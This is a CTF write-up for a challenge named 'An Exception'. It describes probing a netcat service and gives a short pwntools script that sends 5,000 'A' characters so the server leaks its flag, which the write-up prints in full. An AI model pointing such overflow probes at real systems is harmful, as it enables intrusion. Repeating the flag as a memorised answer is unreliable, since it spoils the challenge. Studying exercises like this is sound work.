# An Exception - CTF Challenge Writeup

## Challenge Information
- **Name:** An Exception
- **Description:** No source. This is easy. Glhf <3
- **Server:** `nc 13.61.183.242 9001`

## Summary

**Flag:** `flag{0verfl0ws_r_s0_simple!}`

**Original Message/Behavior:** The server prompts "Enter Something: " and echoes back the first word of user input with "Your Input Is: [input]".

**Vulnerability:** Buffer overflow - sending a very long input string (~5000 characters) causes the flag to be leaked at the end of the response.

## Analysis

### Initial Reconnaissance

Upon connecting to the server:
```
$ nc 13.61.183.242 9001
Enter Something: test input here
Your Input Is: test
```

The server:
1. Prompts for input
2. Splits the input by whitespace
3. Returns only the first word
4. Closes the connection

### Red Herrings

The challenge name "An Exception" initially suggested that exploiting exception handling was the goal. Testing revealed:

- **Empty input** - Triggers an IndexError (from `.split()[0]` on empty string), connection stays open but no output
- **Whitespace-only input** - Same behavior as empty input
- **Various Python payloads** - Simply echoed back, no code execution

These were dead ends.

### The Real Vulnerability

Through systematic testing with various input lengths, I discovered that sending a very long input string (around 5000 characters) causes the server to leak additional data - the flag!

```python
r.sendline(b'A' * 5000)
response = r.recvall()
# Response ends with: ...\nflag{0verfl0ws_r_s0_simple!}
```

This is a classic **buffer overflow** vulnerability. The server likely has a fixed-size buffer for storing/processing input, and exceeding that buffer causes adjacent memory (containing the flag) to be included in the output.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

r = remote('13.61.183.242', 9001)
r.recvuntil(b': ')
r.sendline(b'A' * 5000)
response = r.recvall(timeout=10)

# Extract flag from response
start = response.find(b'flag{')
end = response.find(b'}', start) + 1
flag = response[start:end].decode()
print(f"FLAG: {flag}")
r.close()
```

## Flag

```
flag{0verfl0ws_r_s0_simple!}
```

The flag's message "0verfl0ws_r_s0_simple!" (overflows are so simple) confirms that this was indeed a buffer overflow challenge disguised by the misleading name "An Exception".
